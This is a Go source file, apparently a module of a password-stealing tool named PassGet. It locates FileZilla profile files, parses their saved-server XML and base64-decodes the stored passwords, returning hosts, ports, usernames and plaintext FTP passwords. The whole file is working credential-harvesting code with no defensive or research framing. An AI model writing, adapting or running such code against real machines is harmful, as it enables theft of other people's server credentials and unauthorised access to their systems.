package filezilla

import (
	"PassGet/modules/utils"
	"encoding/base64"
	"encoding/xml"
	"fmt"
	"log"
	"os"
	"strings"
)

type Server struct {
	Host     string `xml:"Host"`
	Port     string `xml:"Port"`
	User     string `xml:"User"`
	Pass     string `xml:"Pass"`
	Password string
}
type ServerDetails struct {
	RecentServers struct {
		Server []Server `xml:"Server"`
	} `xml:"RecentServers"`
}

func Get() []Server {
	files, _, err := utils.ListFilesAndDirs(utils.FileZillaProfilesDir)
	if err != nil {
		log.Println(err)
		return nil
	}
	for _, file := range files {
		if strings.Contains(file, utils.FileZillaProfile1) || strings.Contains(file, utils.FileZillaProfile2) {
			FtpServerDetails := GetServerDetails(file)
			if FtpServerDetails == nil {
				return nil
			}
			Servers := make([]Server, 0)
			for _, server := range FtpServerDetails.RecentServers.Server {
				if server.Pass != "" {
					decoded, err := base64.StdEncoding.DecodeString(server.Pass)
					if err != nil {
						continue
					}
					server.Password = string(decoded)
					Servers = append(Servers, server)
					continue
				}
				Servers = append(Servers, server)
			}
			return Servers
		}
	}
	return nil
}
func GetServerDetails(filename string) *ServerDetails {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Println("Error opening file:", err)
		return nil
	}
	defer file.Close()
	ClientConfigFile := new(ServerDetails)
	decoder := xml.NewDecoder(file)
	err = decoder.Decode(ClientConfigFile)
	if err != nil {
		fmt.Println("Error decoding XML:", err)
		return nil
	}
	return ClientConfigFile
}
